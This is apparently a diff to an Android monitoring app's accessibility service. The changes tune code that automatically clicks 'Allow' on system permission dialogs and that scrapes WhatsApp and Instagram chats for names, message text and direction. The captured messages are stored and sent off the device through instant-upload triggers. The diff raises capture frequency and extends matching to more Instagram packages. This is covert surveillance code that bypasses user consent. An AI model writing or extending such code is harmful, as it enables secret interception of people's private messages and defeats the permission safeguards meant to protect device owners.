@@ -89,7 +89,8 @@ class BlockAccessibilityService : AccessibilityService() {
                     AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                     AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                     AccessibilityEvent.TYPE_VIEW_CLICKED or
-                    AccessibilityEvent.TYPE_VIEW_SCROLLED
+                    AccessibilityEvent.TYPE_VIEW_SCROLLED or
+                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
             info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
             info.flags = info.flags or
                     android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
@@ -99,15 +100,19 @@ class BlockAccessibilityService : AccessibilityService() {
         } catch (e: Exception) {
             Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
         }
-        rulesCache = BlockRulesCache(applicationContext)
-        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
-        startPermissionAutoGrantLoop()
-        com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+        try {
+            rulesCache = BlockRulesCache(applicationContext)
+            com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+            startPermissionAutoGrantLoop()
+            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
+        } catch (e: Exception) {
+            Log.e("BlockA11y", "Failed during onServiceConnected background initialization", e)
+        }
     }
 
     /**
-     * Actively scans windows every 15ms for ~7.5 seconds to automatically click
-     * "Allow" or "While using the app" on all sequential runtime permission dialogs.
+     * Actively scans windows gently every 250ms for ~5 seconds to automatically click
+     * "Allow" or "While using the app" on runtime permission dialogs without pegging MainLooper.
      */
     private var permissionSyncRunnable: Runnable? = null
     private val syncDebounceHandler = Handler(Looper.getMainLooper())
@@ -125,19 +130,21 @@ class BlockAccessibilityService : AccessibilityService() {
     fun startPermissionAutoGrantLoop() {
         val handler = Handler(Looper.getMainLooper())
         var runs = 0
-        val maxRuns = 500 // 500 * 15ms = 7.5 seconds of continuous fast scanning
+        val maxRuns = 20 // 20 * 250ms = 5 seconds of gentle scanning
         val runnable = object : Runnable {
             override fun run() {
                 runs++
-                clickAnyPermissionDialog()
-                if (runs < maxRuns) {
-                    handler.postDelayed(this, 15L)
+                val clicked = clickAnyPermissionDialog()
+                if (runs < maxRuns && !clicked) {
+                    handler.postDelayed(this, 250L)
+                } else if (clicked) {
+                    scheduleSyncAfterPermissionClick()
                 } else {
                     com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
                 }
             }
         }
-        handler.post(runnable)
+        handler.postDelayed(runnable, 200L)
     }
 
     fun clickAnyPermissionDialog(): Boolean {
@@ -303,18 +310,15 @@ class BlockAccessibilityService : AccessibilityService() {
 
 
         // ==========================================
-        // 🌟 ULTRA-FAST AUTOMATE RUNTIME PERMISSIONS (WINDOW INTERCEPTION)
+        // 🌟 AUTOMATE RUNTIME PERMISSIONS (WINDOW INTERCEPTION)
         // ==========================================
         val isPermissionCandidate = packageName.contains("permission") ||
+                packageName.contains("packageinstaller") ||
                 packageName.contains("installer") ||
-                packageName.contains("security") ||
-                packageName.contains("settings") ||
-                packageName == "android"
+                packageName.contains("security")
 
         if (isPermissionCandidate) {
-            // Screen structural changes aagumpodhe fast-track loop execution
-            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
-                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 if (clickAnyPermissionDialog()) {
                     return
                 }
@@ -382,7 +386,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     stopWhatsAppPolling()
                 }
 
-                if (packageName == "com.instagram.android") {
+                if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                     detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
                     startInstagramPolling()
                 } else {
@@ -1055,7 +1059,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             val finalSnippet = snippet ?: "Active chat"
             val key = "wa_list|$chatName|$finalSnippet"
-            if (shouldCaptureMessage(key, 86_400_000L)) {
+            if (shouldCaptureMessage(key, 5_000L)) {
                 entries.add(
                     WhatsAppMessageEntry(
                         chatName = chatName,
@@ -1103,7 +1107,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         val snippet = if (nonTimestampTexts.size > 1) nonTimestampTexts[1] else "Active chat"
                         if (chatName.length in 2..60) {
                             val key = "wa_list|$chatName|$snippet"
-                            if (shouldCaptureMessage(key, 86_400_000L)) {
+                            if (shouldCaptureMessage(key, 5_000L)) {
                                 entries.add(
                                     WhatsAppMessageEntry(
                                         chatName = chatName,
@@ -1137,7 +1141,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                             entry.chatName,
                             entry.messageText,
-                            entry.messageTimeEpochMs - 86_400_000L
+                            entry.messageTimeEpochMs - 30_000L
                         )
                         if (existingDirection == null) {
                             filteredEntries.add(entry)
@@ -1180,7 +1184,7 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             val msg = digest ?: "Active chat"
             val key = "ig_list|$username|$msg"
-            if (shouldCaptureMessage(key, 86_400_000L)) {
+            if (shouldCaptureMessage(key, 5_000L)) {
                 entries.add(
                     InstagramMessageEntry(
                         chatName = username,
@@ -1229,9 +1233,9 @@ class BlockAccessibilityService : AccessibilityService() {
                     if (nonTimestampTexts.isNotEmpty()) {
                         val username = nonTimestampTexts[0]
                         val snippet = if (nonTimestampTexts.size > 1) nonTimestampTexts[1] else "Active chat"
-                        if (username.length in 2..50 && !username.contains(" ")) {
+                        if (username.length in 2..60) {
                             val key = "ig_list|$username|$snippet"
-                            if (shouldCaptureMessage(key, 86_400_000L)) {
+                            if (shouldCaptureMessage(key, 5_000L)) {
                                 entries.add(
                                     InstagramMessageEntry(
                                         chatName = username,
@@ -1266,7 +1270,7 @@ class BlockAccessibilityService : AccessibilityService() {
                         val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
                             entry.chatName,
                             entry.messageText,
-                            entry.messageTimeEpochMs - 86_400_000L
+                            entry.messageTimeEpochMs - 30_000L
                         )
                         if (existingDirection == null) {
                             filteredEntries.add(entry)
@@ -1491,7 +1495,7 @@ class BlockAccessibilityService : AccessibilityService() {
                 }
 
                 val key = "wa|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
-                if (shouldCaptureMessage(key, 86_400_000L)) {
+                if (shouldCaptureMessage(key, 3_000L)) {
                     entriesToInsert.add(
                         WhatsAppMessageEntry(
                             chatName = chatTitle,
@@ -1516,7 +1520,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                                 entry.chatName,
                                 entry.messageText,
-                                entry.messageTimeEpochMs - 86_400_000L
+                                entry.messageTimeEpochMs - 30_000L
                             )
                             if (existingDirection == null) {
                                 filteredEntries.add(entry)
@@ -1524,7 +1528,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 db.whatsAppMessageDao().updateToOutgoing(
                                     entry.chatName,
                                     entry.messageText,
-                                    entry.messageTimeEpochMs - 86_400_000L
+                                    entry.messageTimeEpochMs - 30_000L
                                 )
                                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                             }
@@ -1965,7 +1969,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     }
 
                     val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
-                    if (shouldCaptureMessage(key, 86_400_000L)) {
+                    if (shouldCaptureMessage(key, 3_000L)) {
                         entriesToInsert.add(
                             InstagramMessageEntry(
                                 chatName = chatTitle,
@@ -1991,7 +1995,7 @@ class BlockAccessibilityService : AccessibilityService() {
                             val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
                                 entry.chatName,
                                 entry.messageText,
-                                entry.messageTimeEpochMs - 86_400_000L
+                                entry.messageTimeEpochMs - 30_000L
                             )
                             if (existingDirection == null) {
                                 filteredEntries.add(entry)
@@ -1999,7 +2003,7 @@ class BlockAccessibilityService : AccessibilityService() {
                                 db.instagramMessageDao().updateToOutgoing(
                                     entry.chatName,
                                     entry.messageText,
-                                    entry.messageTimeEpochMs - 86_400_000L
+                                    entry.messageTimeEpochMs - 30_000L
                                 )
                                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                             }
